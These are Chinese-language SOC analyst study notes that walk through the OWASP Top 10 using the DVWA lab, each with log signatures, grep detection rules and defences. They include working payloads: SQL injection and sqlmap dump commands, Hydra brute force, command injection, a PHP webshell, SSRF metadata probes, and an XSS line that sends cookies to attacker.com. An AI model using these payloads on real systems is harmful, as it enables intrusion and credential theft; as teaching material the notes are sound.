# 🛡️ OWASP Top 10 + DVWA 靶场 — SOC分析师学习笔记

> **适用对象**：安全运营工程师 / SOC分析师 初学者
> **学习周期**：建议 20 天，每天 2 小时
> **前置要求**：已完成计算机网络基础 + Linux 命令与日志分析
> **核心原则**：**理解漏洞原理 + DVWA 复现 + 日志中识别攻击**

---

## 📅 学习路线图

| 天数 | 主题 | 核心内容 | 验证任务 |
|------|------|---------|---------|
| Day 31-33 | OWASP Top 10 概览 + 环境搭建 | 2021版Top10、DVWA安装、Burp Suite配置 | DVWA能正常访问，Burp能抓包 |
| Day 34-36 | A01 失效访问控制 + A02 加密失败 | 越权、目录遍历、明文传输 | DVWA复现、Wireshark抓包验证 |
| Day 37-40 | A03 注入（⭐核心）| SQL注入、命令注入、LDAP注入 | DVWA SQL Injection Low→High |
| Day 41-42 | A07 认证失败 | 暴力破解、弱口令、会话劫持 | DVWA Brute Force、Hydra使用 |
| Day 43-44 | XSS（⭐核心）| 反射型、存储型、DOM型 | DVWA XSS Low→High |
| Day 45-46 | 文件操作漏洞 | 文件上传、文件包含、路径遍历 | DVWA File Upload + Include |
| Day 47-48 | A10 SSRF + 其他 | SSRF原理、防御 | 手工验证、日志分析 |
| Day 49-50 | 综合靶机 + 防御总结 | Pikachu/Upload-labs、WAF规则 | 能写出防御方案 |

---

## 第一部分：环境搭建

### 1.1 DVWA 安装（Docker 方式，最快）

```bash
# 拉取镜像
docker pull vulnerables/web-dvwa

# 运行
docker run -d -p 80:80 vulnerables/web-dvwa

# 默认账号
# URL: http://localhost
# 用户名: admin
# 密码: password
```

**初始化**：访问页面 → 点击 "Create / Reset Database" → 重新登录

### 1.2 Burp Suite 配置

```
1. 下载 Burp Suite Community Edition（免费版）
2. 设置浏览器代理: 127.0.0.1:8080
3. Burp → Proxy → Options → 确认监听 8080
4. 安装 CA 证书（HTTPS抓包需要）
5. DVWA Security Level 设置为 Low
```

### 1.3 SQLMap 安装

```bash
# Kali 自带
sqlmap --version

# 或 pip 安装
pip install sqlmap
```

### 1.4 其他工具

| 工具 | 用途 | 安装 |
|------|------|------|
| Burp Suite | 代理抓包、改包、重放 | 官网下载 |
| SQLMap | SQL注入自动化检测 | Kali自带/pip |
| Hydra | 暴力破解 | apt install hydra |
| Nmap | 端口扫描 | apt install nmap |
| Nikto | Web漏洞扫描 | apt install nikto |
| Dirb/Dirbuster | 目录爆破 | apt install dirb |

---

## 第二部分：OWASP Top 10 2021 详解

### A01:2021 – Broken Access Control（失效的访问控制）

**原理**：用户能访问到不该访问的资源或执行不该执行的操作。

**常见类型**：
- **水平越权**：用户A能访问用户B的数据（同权限级别）
- **垂直越权**：普通用户能执行管理员操作
- **目录遍历**：`../../../etc/passwd`
- **未授权访问**：直接访问后台接口无需登录

**DVWA 复现**：
```
DVWA → DVWA Security → Low
→ 访问 http://localhost/vulnerabilities/fi/?page=../../hackable/flags/fi.php
→ 尝试 ../../../etc/passwd（文件包含漏洞也涉及此问题）
```

**日志特征**：
```
192.168.1.100 - - [15/Jan/2024:10:30:45] "GET /user/profile?id=1002 HTTP/1.1" 200
# 正常用户访问自己的资料（id=1001）
# 但日志中 id=1002，说明在遍历其他用户ID

192.168.1.100 - - [15/Jan/2024:10:30:46] "GET /admin/dashboard HTTP/1.1" 200
# 未授权访问管理后台

192.168.1.100 - - [15/Jan/2024:10:30:47] "GET /download?file=../../../etc/passwd HTTP/1.1" 200
# 目录遍历攻击
```

**SOC 检测**：
```bash
# 检测ID遍历（短时间内大量不同ID请求）
awk '/profile\?id=/{print $1, $7}' access.log | awk -F'id=' '{print $2}' | awk '{print $1}' | sort | uniq -c | sort -rn

# 检测目录遍历特征
grep -E "\.\./|\.\.\|%2e%2e%2f|%252e%252e%252f" access.log

# 检测未授权访问管理后台
grep -E "/admin|/manage|/console|/api/admin" access.log | grep '" 200 '
```

**防御**：
- 后端严格校验用户权限（不要只依赖前端隐藏按钮）
- 使用间接引用映射（不要直接暴露数据库ID）
- 目录遍历：过滤 `../`、规范化路径
- 最小权限原则

---

### A02:2021 – Cryptographic Failures（加密机制失效）

**原理**：敏感数据未加密或使用了弱加密算法。

**常见场景**：
- 明文传输密码（HTTP而非HTTPS）
- 使用 MD5/SHA1 存储密码（已被彩虹表破解）
- 硬编码密钥在代码中
- 敏感数据（身份证号、银行卡）明文存储

**DVWA 复现**：
```
1. DVWA 登录页面用 HTTP（非HTTPS）
2. Burp 抓包 → 能看到明文密码
3. 查看 DVWA 数据库：
   mysql -u dvwa -p dvwa
   SELECT user, password FROM users;
   # 默认使用 MD5 存储
```

**日志特征**：
```
# 日志本身看不到加密问题，需要结合流量分析
# 但可以通过以下迹象推测：

# 1. 大量 HTTP（非HTTPS）登录请求
"POST /login HTTP/1.1" 302

# 2. 密码重置接口被频繁调用（可能尝试枚举）
"POST /api/reset-password HTTP/1.1" 200
```

**SOC 检测**：
- 监控 HTTP（非HTTPS）的敏感接口（登录、支付、个人信息）
- 监控密码重置/找回接口的调用频率
- 结合漏洞扫描结果，关注"明文传输"告警

**防御**：
- 全站 HTTPS（HSTS）
- 密码用 bcrypt/Argon2/ scrypt 存储（带salt）
- 敏感数据加密存储（AES-256-GCM）
- 密钥托管在 KMS/HSM 中，不硬编码

---

### A03:2021 – Injection（注入）⭐⭐⭐ SOC核心

**原理**：用户输入被当作代码执行。

**常见类型**：
- SQL 注入
- 命令注入（OS Command Injection）
- LDAP 注入
- XPath 注入
- NoSQL 注入

#### SQL 注入（⭐⭐⭐面试必考）

**原理**：用户输入拼接到 SQL 语句中，改变原语句逻辑。

**DVWA Low 级别复现**：
```
URL: http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit

# 正常输入
id=1
SQL: SELECT first_name, last_name FROM users WHERE user_id = '1';

# 注入测试
id=1' OR '1'='1
SQL: SELECT first_name, last_name FROM users WHERE user_id = '1' OR '1'='1';
# 返回所有用户

# 联合查询注入（Union Based）
id=1' UNION SELECT user, password FROM users-- -
SQL: SELECT first_name, last_name FROM users WHERE user_id = '1' 
     UNION SELECT user, password FROM users-- -';
# 返回用户和密码

# 报错注入（Error Based）
id=1' AND extractvalue(1, concat(0x7e, (SELECT @@version), 0x7e))-- -

# 布尔盲注（Boolean Based Blind）
id=1' AND SUBSTRING((SELECT password FROM users WHERE user='admin'),1,1)='a'-- -

# 时间盲注（Time Based Blind）
id=1' AND IF(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a', SLEEP(5), 0)-- -
```

**SQLMap 自动化**：
```bash
# 找到注入点（Burp复制URL）
sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit"   --cookie="PHPSESSID=xxx; security=low"

# 获取数据库名
sqlmap -u "..." --cookie="..." --dbs

# 获取表名
sqlmap -u "..." --cookie="..." -D dvwa --tables

# 获取列名
sqlmap -u "..." --cookie="..." -D dvwa -T users --columns

# 获取数据
sqlmap -u "..." --cookie="..." -D dvwa -T users -C user,password --dump

# 获取当前用户和权限
sqlmap -u "..." --cookie="..." --current-user --is-dba
```

**日志特征（⭐SOC必须会识别）**：
```
# 1. URL中出现SQL关键字
"GET /search?q=1' UNION SELECT * FROM users-- HTTP/1.1" 200
"GET /product?id=1' OR '1'='1 HTTP/1.1" 200
"GET /news?id=1; DROP TABLE users-- HTTP/1.1" 500

# 2. 出现注释符
-- -、#、/* */

# 3. 出现时间延迟函数（盲注）
SLEEP(5)、BENCHMARK(1000000,MD5(1))、pg_sleep(5)

# 4. 出现数据库函数
@@version、database()、user()、sysdate()

# 5. 出现UNION SELECT
UNION SELECT、UNION ALL SELECT

# 6. 出现布尔条件
OR '1'='1、AND 1=1、' OR 1=1--

# 7. 出现堆叠查询（Stacked Queries）
; DROP TABLE、; INSERT INTO、; UPDATE

# 8. 出现报错函数
extractvalue()、updatexml()、floor()、exp()
```

**SOC 检测命令**：
```bash
# 检测SQL注入特征
grep -iE "union.*select|select.*from|drop.*table|insert.*into|delete.*from|update.*set|-- |# |/\*|sleep\(|benchmark\(|extractvalue\(|updatexml\(|@@version|database\(\)|1=1|1'='1" access.log

# 检测时间盲注（响应时间异常长的请求）
# 需要日志中有响应时间字段，或使用awk计算
awk '$NF > 5 {print}' access.log  # 假设最后一列是响应时间（秒）

# 检测报错注入（500错误 + SQL特征）
grep '" 500 ' access.log | grep -iE "extractvalue|updatexml|floor\(rand"

# 统计SQL注入尝试TOP IP
grep -iE "union.*select|1=1|sleep\(" access.log | awk '{print $1}' | sort | uniq -c | sort -rn | head -n 10
```

**防御**：
- **参数化查询（Prepared Statements）**：唯一正确防御方式
- **输入验证**：白名单过滤（不要黑名单）
- **最小权限**：数据库用户只给必要权限
- **WAF规则**：ModSecurity、雷池等
- **错误信息隐藏**：不要暴露数据库错误详情

**面试题**：SQL注入的原理和防御？
> "SQL注入是攻击者将恶意SQL语句插入到应用程序的输入中，被数据库执行。防御的核心是使用参数化查询（Prepared Statements），将用户输入作为参数而非SQL代码的一部分。辅助措施包括输入验证（白名单）、最小权限原则、WAF防护、隐藏详细错误信息。"

#### 命令注入（Command Injection）

**原理**：用户输入被拼接到系统命令中执行。

**DVWA 复现**：
```
DVWA → Command Injection
输入: 127.0.0.1; cat /etc/passwd
输入: 127.0.0.1 && whoami
输入: 127.0.0.1 | ls -la
```

**日志特征**：
```
"GET /ping?ip=127.0.0.1;cat+/etc/passwd HTTP/1.1" 200
"GET /ping?ip=127.0.0.1%26%26whoami HTTP/1.1" 200
"GET /ping?ip=127.0.0.1|ls+-la HTTP/1.1" 200
```

**SOC 检测**：
```bash
# 检测命令注入特征
grep -iE ";.*cat|;.*whoami|;.*ls |\|.*cat|\|.*whoami|\|.*ls |&&.*cat|&&.*whoami|`.*cat|`.*whoami" access.log

# 检测敏感文件访问
grep -iE "etc/passwd|etc/shadow|windows/system32|\.\.\/\.\.\/" access.log
```

**防御**：
- 不要拼接命令，使用参数化API（如Python的subprocess.run with list）
- 输入验证和转义
- 使用白名单限制输入格式（如只允许IP地址格式）

---

### A07:2021 – Identification and Authentication Failures（认证失败）

**原理**：身份认证和会话管理存在缺陷。

**常见场景**：
- 暴力破解（Brute Force）
- 弱口令
- 会话固定（Session Fixation）
- Cookie 未设置 HttpOnly / Secure
- 密码找回逻辑缺陷
- 多因素认证绕过

#### 暴力破解（⭐SOC高频场景）

**DVWA Brute Force 复现**：
```bash
# Hydra 暴力破解
hydra -l admin -P /usr/share/wordlists/rockyou.txt   localhost http-get-form   "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect.:H=Cookie: PHPSESSID=xxx; security=low"

# 或 Burp Intruder
```

**日志特征**：
```
192.168.1.100 - - [15/Jan/2024:10:30:45] "POST /login HTTP/1.1" 401
192.168.1.100 - - [15/Jan/2024:10:30:46] "POST /login HTTP/1.1" 401
192.168.1.100 - - [15/Jan/2024:10:30:47] "POST /login HTTP/1.1" 401
192.168.1.100 - - [15/Jan/2024:10:30:48] "POST /login HTTP/1.1" 401
# 同一IP短时间内大量401/403

192.168.1.100 - - [15/Jan/2024:10:30:49] "POST /login HTTP/1.1" 302
# 最后一条是302（重定向到首页），说明破解成功！
```

**SOC 检测**：
```bash
# 统计登录失败次数TOP IP（1分钟内超过5次即异常）
grep '"POST /login' access.log | grep '" 401 ' | awk '{print $1, $4}' | sed 's/\[//' | cut -d: -f1,2 | uniq -c | awk '$1 > 5'

# 检测成功登录前的大量失败（破解成功）
# 先提取某IP的所有登录记录，观察模式
awk '$1=="192.168.1.100" && $7 ~ /login/' access.log

# 检测使用常见弱口令的尝试
grep -iE "password=123456|password=admin|password=password|password=qwerty" access.log

# 检测分布式暴力破解（不同IP但相同用户名）
grep '"POST /login' access.log | awk -F'username=' '{print $2}' | awk '{print $1}' | sort | uniq -c | sort -rn | head
```

**防御**：
- 登录失败锁定（3次失败锁定15分钟）
- 验证码（reCAPTCHA、图形验证码）
- 双因素认证（2FA/MFA）
- 密码复杂度策略
- 登录告警（异地登录、非常用设备）
- 速率限制（Rate Limiting）

#### 会话管理问题

**常见漏洞**：
- Session ID 可预测
- Session 未过期（关闭浏览器后仍有效）
- Session 未绑定 IP/User-Agent
- Cookie 未设置 HttpOnly（可被XSS窃取）

**SOC 检测**：
```bash
# 检测同一Session ID从不同IP使用（会话劫持迹象）
awk -F'PHPSESSID=' '/PHPSESSID/{print $2}' access.log | awk '{print $1}' | sort | uniq -c | sort -rn

# 检测异常的Session使用模式
```

---

### XSS（跨站脚本攻击）⭐⭐⭐ SOC核心

**原理**：攻击者注入恶意脚本到网页中，其他用户浏览时执行。

**三种类型**：

| 类型 | 触发方式 | 持久性 | 危害 |
|------|---------|--------|------|
| **反射型 XSS** | 点击恶意链接触发 | 不持久 | 窃取Cookie、钓鱼 |
| **存储型 XSS** | 恶意脚本存储在服务器（数据库）| 持久 | 影响所有浏览用户，危害最大 |
| **DOM型 XSS** | 前端JavaScript处理不当 | 不持久 | 修改页面内容、重定向 |

**DVWA 反射型 XSS 复现**：
```
URL: http://localhost/vulnerabilities/xss_r/?name=

输入: <script>alert('XSS')</script>
输入: <script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>
输入: <img src=x onerror=alert('XSS')>
输入: <svg onload=alert('XSS')>
```

**DVWA 存储型 XSS 复现**：
```
在留言板输入:
<script>alert(document.cookie)</script>

每次有人访问该页面，都会触发
```

**日志特征（⭐SOC必须会识别）**：
```
# 1. URL/参数中出现脚本标签
"GET /search?q=<script>alert(1)</script> HTTP/1.1" 200
"GET /comment?text=<img+src=x+onerror=alert(1)> HTTP/1.1" 200
"POST /post HTTP/1.1" 200  # POST body中有<script>

# 2. 出现事件处理器
onerror=、onload=、onclick=、onmouseover=、onfocus=

# 3. 出现JavaScript伪协议
javascript:alert(1)

# 4. 出现HTML标签（在不该出现的地方）
<script>、<iframe>、<svg>、<object>、<embed>

# 5. 编码绕过
%3Cscript%3E、<script>、<scr<script>ipt>

# 6. 出现Cookie外带（数据窃取）
document.cookie、location.href、fetch()、XMLHttpRequest
```

**SOC 检测命令**：
```bash
# 检测XSS攻击特征
grep -iE "<script|</script>|<iframe|<svg|<object|<embed|onerror=|onload=|onclick=|onmouseover=|javascript:|document\.cookie|document\.location" access.log

# 检测URL编码的XSS
# %3C = <, %3E = >, %22 = ", %27 = '
grep -iE "%3Cscript|%3C%2Fscript|%3Ciframe|%22onerror|%27onload" access.log

# 统计XSS尝试TOP IP
grep -iE "<script|onerror=|javascript:" access.log | awk '{print $1}' | sort | uniq -c | sort -rn | head -n 10

# 检测存储型XSS（POST请求中包含脚本）
# 需要记录POST body（Nginx需要配置 $request_body）
```

**防御**：
- **输出编码（Output Encoding）**：根据上下文（HTML、JS、URL、CSS）进行编码
- **输入验证**：白名单过滤
- **CSP（Content Security Policy）**：限制脚本来源
- **HttpOnly Cookie**：防止XSS窃取Cookie
- **X-XSS-Protection 头**：浏览器内置XSS过滤器

**面试题**：XSS 的三种类型和防御？
> "XSS分为反射型、存储型和DOM型。反射型通过恶意链接触发，不持久；存储型将恶意脚本存入数据库，影响所有用户，危害最大；DOM型由前端JavaScript处理不当导致。防御核心是输出编码，根据上下文对特殊字符进行HTML实体编码。辅助措施包括CSP策略、HttpOnly Cookie、输入验证、X-XSS-Protection响应头。"

---

### 文件上传漏洞 + 文件包含漏洞

#### 文件上传（File Upload）

**原理**：上传了可执行的恶意文件（如PHP木马）。

**DVWA 复现**：
```
Low级别:
1. 创建 shell.php: <?php system($_GET['cmd']); ?>
2. DVWA → File Upload → 上传 shell.php
3. 访问上传后的URL: http://localhost/hackable/uploads/shell.php?cmd=whoami

Medium级别:
- 只检查Content-Type，不改文件名
- Burp改包: Content-Type: image/jpeg

High级别:
- 检查文件头（GIF89a）
- 制作图片马: cat normal.jpg shell.php > shell.jpg.php
```

**日志特征**：
```
"POST /upload HTTP/1.1" 200  # 上传请求
"GET /uploads/shell.php?cmd=whoami HTTP/1.1" 200  # 执行命令
"GET /uploads/shell.php?cmd=cat+/etc/passwd HTTP/1.1" 200
```

**SOC 检测**：
```bash
# 检测上传目录的可疑访问
grep -E "/uploads/|/upload/|/files/|/attachments/" access.log | grep -v '\.(jpg|png|gif|pdf)$'

# 检测上传后执行脚本
grep -E "/uploads/.*\.php|/uploads/.*\.jsp|/uploads/.*\.asp" access.log

# 检测命令执行特征（上传后的利用）
grep -E "cmd=|command=|exec=|shell=" access.log
```

**防御**：
- 白名单扩展名（不要黑名单）
- 重命名上传文件（去掉扩展名或使用随机名）
- 存储目录不可执行（.htaccess/nginx配置）
- 文件类型魔数检查（不只检查扩展名）
- 图片二次渲染（压缩/缩放）
- 云存储/OSS隔离

#### 文件包含（File Inclusion）

**原理**：动态包含文件时，用户可控文件路径。

**类型**：
- **LFI（本地文件包含）**：`?page=../../../etc/passwd`
- **RFI（远程文件包含）**：`?page=http://attacker.com/shell.txt`

**DVWA 复现**：
```
Low级别:
?page=../../../etc/passwd
?page=../../../etc/shadow
?page=../../../var/log/apache2/access.log

# 配合文件上传 getshell
?page=../../hackable/uploads/shell.php
```

**日志特征**：
```
"GET /index.php?page=../../../etc/passwd HTTP/1.1" 200
"GET /index.php?page=http://192.168.1.100/shell.txt HTTP/1.1" 200
```

**SOC 检测**：
```bash
# 检测文件包含特征
grep -E "\.\./|\.\.\|%2e%2e%2f|%252e%252e%252f|file://|http://.*\.txt|http://.*\.php" access.log

# 检测敏感文件访问
grep -iE "passwd|shadow|hosts|win\.ini|system32|boot\.ini|\.htaccess|web\.config" access.log
```

---

### A10:2021 – SSRF（服务器端请求伪造）

**原理**：服务器根据用户输入发起请求，攻击者让服务器访问内部资源或外部恶意地址。

**危害**：
- 访问内网服务（Redis、Elasticsearch、Docker API）
- 读取本地文件（file:///etc/passwd）
- 云环境元数据窃取（AWS 169.254.169.254）
- 端口扫描（通过响应时间/错误信息判断端口开放）

**DVWA 无直接SSRF，手工验证**：
```
假设存在功能: http://target.com/fetch?url=http://example.com

攻击:
/fetch?url=http://127.0.0.1:22        # 探测本地SSH
/fetch?url=http://127.0.0.1:3306       # 探测本地MySQL
/fetch?url=http://127.0.0.1:6379       # 探测本地Redis
/fetch?url=file:///etc/passwd          # 读取本地文件
/fetch?url=http://169.254.169.254/latest/meta-data/  # AWS元数据
```

**日志特征**：
```
"GET /fetch?url=http://127.0.0.1:22 HTTP/1.1" 200
"GET /fetch?url=http://127.0.0.1:3306 HTTP/1.1" 200
"GET /fetch?url=file:///etc/passwd HTTP/1.1" 200
"GET /fetch?url=http://169.254.169.254/latest/meta-data/ HTTP/1.1" 200
```

**SOC 检测**：
```bash
# 检测SSRF特征
grep -E "url=http://127\.|url=http://192\.168\.|url=http://10\.|url=http://172\.|url=file://|url=http://169\.254" access.log

# 检测内网IP访问（如果应用不应该访问内网）
grep -E "\?url=.*192\.168\.\|url=.*10\.\|url=.*172\.(1[6-9]|2[0-9]|3[01])\." access.log

# 检测云元数据访问
grep "169\.254\.169\.254" access.log
```

**防御**：
- URL白名单（只允许特定域名）
- 禁用非HTTP协议（file://、ftp://、gopher://）
- 禁用内网IP访问（127.0.0.0/8、10.0.0.0/8、172.16.0.0/12、192.168.0.0/16、169.254.169.254）
- 统一错误处理（不要暴露端口开放信息）

---

## 第三部分：SOC 日志分析实战总结

### Web 攻击日志特征速查表

| 攻击类型 | 日志关键词 | 状态码 | SOC检测命令 |
|---------|-----------|--------|------------|
| SQL注入 | `union`、`select`、`sleep(`、`1=1`、`--` | 200/500 | `grep -iE "union.*select\|sleep("` |
| XSS | `<script>`、`onerror=`、`javascript:` | 200 | `grep -iE "<script\|onerror="` |
| 命令注入 | `;cat`、`\|whoami`、`&&ls` | 200 | `grep -iE ";.*cat\|\|.*whoami"` |
| 目录遍历 | `../`、`..%2f`、`file://` | 200 | `grep -E "\.\./\|file://"` |
| 暴力破解 | 大量 `POST /login` + 401 | 401/302 | 统计IP登录失败次数 |
| 文件上传 | `POST /upload` + 后续脚本执行 | 200 | 检查uploads目录访问 |
| 文件包含 | `page=../`、`page=http://` | 200 | `grep -E "page=.*\.\./"` |
| SSRF | `url=127.0.0.1`、`url=file://` | 200 | `grep -E "url=.*127\.` |
| 扫描 | 大量404、敏感路径 | 404 | 统计404数量TOP IP |

### 面试加分话术

> "我在 DVWA 靶场上复现了 SQL 注入、XSS、文件上传等漏洞，不仅理解了攻击原理，还重点研究了这些攻击在 Web 日志中的特征。在 SOC 工作中，我可以通过分析 Nginx/Apache 访问日志，快速识别 SQL 注入的 UNION SELECT 特征、XSS 的 script 标签、暴力破解的 401 频率异常，并结合 WAF 日志进行关联分析，实现攻击的及时发现和处置。"

---

## 第四部分：面试题速查

### OWASP Top 10 面试题

| 题目 | 答案要点 |
|------|---------|
| OWASP Top 10 是什么？ | Open Web Application Security Project，每年发布的Web应用十大安全风险 |
| 2021版Top10有哪些？ | 访问控制、加密失败、注入、不安全设计、配置错误、过时组件、认证失败、完整性失败、日志监控不足、SSRF |
| SQL注入原理？ | 用户输入拼接到SQL语句中，改变查询逻辑 |
| SQL注入类型？ | Union、Error、Boolean盲注、Time盲注、Stacked Query |
| SQL注入防御？ | 参数化查询（唯一正确）、输入验证、最小权限、WAF |
| XSS三种类型？ | 反射型、存储型、DOM型 |
| XSS防御？ | 输出编码、CSP、HttpOnly Cookie、输入验证 |
| 文件上传防御？ | 白名单扩展名、重命名、目录不可执行、魔数检查、二次渲染 |
| 暴力破解检测？ | 统计登录失败次数、同一IP短时间内大量401、成功前大量失败 |
| SSRF原理和防御？ | 服务器根据用户输入发请求，防御用URL白名单、禁用内网IP和file协议 |
| 越权攻击类型？ | 水平越权（同权限访问他人数据）、垂直越权（低权限访问高权限功能）|
| 目录遍历防御？ | 路径规范化、过滤../、chroot jail |

### SOC 场景题

**Q：从 Nginx 日志中发现大量 404 请求，路径包含 admin、wp-login、phpmyadmin，怎么分析？**
> "这是典型的目录扫描/爆破攻击。首先统计源IP，看是单一IP还是分布式。然后检查是否有 200 状态码的响应，确认是否扫到了真实后台。如果有某个IP同时有大量 200 响应，可能已爆破成功，需紧急排查该IP的后续行为。处置：在防火墙/WAF上封禁恶意IP，加固后台访问控制（改端口、加IP白名单、启用MFA）。"

**Q：如何在日志中发现 SQL 注入攻击？**
> "SQL注入在日志中有明显特征：URL参数中出现 SQL 关键字如 UNION SELECT、DROP TABLE、SLEEP() 等；出现注释符如 -- - 或 #；出现布尔条件如 OR '1'='1；出现数据库函数如 @@version。我会用 grep 或正则表达式批量检测这些特征，统计攻击源IP，结合响应状态码判断攻击是否成功（200 可能成功，500 可能是报错注入）。"

---

## 📚 靶场推荐

| 靶场 | 说明 | 难度 |
|------|------|------|
| **DVWA** | 经典入门靶场，覆盖常见Web漏洞 | 低-中 |
| **Pikachu** | 国产靶场，中文友好，分类清晰 | 低-中 |
| **Upload-labs** | 专门练习文件上传 | 低-高 |
| **SQLi-labs** | 专门练习SQL注入 | 低-高 |
| **XSS-labs** | 专门练习XSS | 低-中 |
| **Hack The Box** | 真实渗透测试环境 | 中-高 |
| **VulnHub** | 虚拟机靶机 | 中-高 |

---

> 💡 **最后建议**：DVWA 每个漏洞都要从 Low 做到 High，理解每一级防御加了什么、怎么绕过。更重要的是，每次攻击后都去查看 access.log，找到攻击留下的痕迹。SOC 分析师的核心能力不是会攻击，而是**能在海量日志中发现攻击**。
